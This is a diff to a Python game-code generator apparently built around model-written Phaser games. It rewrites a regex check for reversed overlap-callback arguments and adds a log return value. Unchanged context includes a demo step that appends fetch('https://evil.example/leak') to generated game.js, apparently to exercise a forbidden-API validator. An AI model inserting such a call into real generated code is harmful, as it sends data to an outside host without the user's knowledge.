@@ -962,12 +962,12 @@ def _js_method(source: str, name: str) -> tuple[list[str], str] | None:
 
 
 def _phaser_player_overlap_issues(js: str) -> list[str]:
-    """Catch delayed Phaser crashes caused by reversed Arcade overlap args.
+    """Catch delayed Phaser crashes caused by Arcade group-vs-player args.
 
-    Phaser passes overlap callbacks in registration order. For
-    overlap(this.enemyBullets, this.player, cb), arg0 is the bullet and arg1 is
-    the player. Model output often names them as if player came first; short
-    smoke tests may miss the crash until the first enemy projectile/touch.
+    In Phaser 4 Arcade Physics, group-vs-sprite callbacks can invoke the
+    callback with the player sprite first and the group child second. Model
+    output often assumes arg0 is the enemy/projectile; short smoke tests may
+    miss the crash until the first hostile touch, bullet, or rocket overlap.
     """
     issues: list[str] = []
     seen: set[str] = set()
@@ -977,23 +977,23 @@ def _phaser_player_overlap_issues(js: str) -> list[str]:
             seen.add(key)
             issues.append(detail)
 
-    def second_arg_misused(collection: str, params: list[str], body: str, key: str) -> None:
-        if len(params) < 2:
+    def first_arg_misused(collection: str, params: list[str], body: str, key: str) -> None:
+        if not params:
             return
-        second = re.escape(params[1])
-        if collection == "enemies" and re.search(rf"\bENEMY\s*\[\s*{second}\.getData\s*\(\s*['\"]type", body):
+        first = re.escape(params[0])
+        if collection == "enemies" and re.search(rf"\bENEMY\s*\[\s*{first}\.getData\s*\(\s*['\"]type", body):
             add_issue(
                 key,
-                "Phaser overlap callback for this.enemies vs this.player treats the second argument as the enemy; Phaser passes the player second.",
+                "Phaser overlap callback for this.enemies vs this.player treats the first argument as the enemy; Phaser may pass the player first.",
             )
         if collection in {"enemyBullets", "rockets"} and (
-            re.search(rf"\bkillObj\s*\(\s*{second}\s*\)", body)
-            or re.search(rf"\bexplode\s*\([^)]*{second}\.x[^)]*,[^)]*{second}\.y", body)
-            or re.search(rf"{second}\.getData\s*\(\s*['\"]dmg", body)
+            re.search(rf"\bkillObj\s*\(\s*{first}\s*\)", body)
+            or re.search(rf"\bexplode\s*\([^)]*{first}\.x[^)]*,[^)]*{first}\.y", body)
+            or re.search(rf"{first}\.getData\s*\(\s*['\"]dmg", body)
         ):
             add_issue(
                 key,
-                f"Phaser overlap callback for this.{collection} vs this.player treats the second argument as the projectile; Phaser passes the player second.",
+                f"Phaser overlap callback for this.{collection} vs this.player treats the first argument as the projectile; Phaser may pass the player first.",
             )
 
     method_re = re.compile(
@@ -1003,7 +1003,7 @@ def _phaser_player_overlap_issues(js: str) -> list[str]:
     for match in method_re.finditer(js):
         method = _js_method(js, match.group(2))
         if method:
-            second_arg_misused(match.group(1), method[0], method[1], match.group(0))
+            first_arg_misused(match.group(1), method[0], method[1], match.group(0))
 
     arrow_re = re.compile(
         r"physics\.add\.overlap\(\s*this\.(enemyBullets|rockets|enemies)\s*,\s*this\.player\s*,\s*\(([^)]*)\)\s*=>\s*(.+?)\s*,\s*null\s*,\s*this",
@@ -1015,7 +1015,7 @@ def _phaser_player_overlap_issues(js: str) -> list[str]:
             for part in match.group(2).split(",")
             if part.strip()
         ]
-        second_arg_misused(match.group(1), params, match.group(3), match.group(0))
+        first_arg_misused(match.group(1), params, match.group(3), match.group(0))
 
     return issues
 
@@ -1261,10 +1261,11 @@ def _repair_balance(balance: dict, archetype: str, attempt: int) -> dict:
     return repaired
 
 
-def _generate_code(state: dict, repair_error: str | None = None) -> tuple[list[dict], int, str]:
+def _generate_code(state: dict, repair_error: str | None = None) -> tuple[list[dict], int, str, list[str]]:
     spec = state.get("game_spec") or {}
     design = state.get("game_design") or {}
     title = str(spec.get("title") or "GameWeave Game")
+    agent_logs: list[str] = []
 
     # 3D：无模板兜底，完全由模型产出。失败/过短 → 返回不合规 bundle，交给 repair/replan。
     if state.get("dimension") == "3d":
@@ -1297,7 +1298,7 @@ def _generate_code(state: dict, repair_error: str | None = None) -> tuple[list[d
             for file in files:
                 if file["path"] == "game.js":
                     file["content"] += '\nfetch("https://evil.example/leak");  // [demo] forbidden API'
-        return files, tokens, mode
+        return files, tokens, mode, agent_logs
 
     # ---- 2D：确定性模板基线 + 模型优先覆盖（原逻辑）----
     tname = templating.select_template(spec, design)
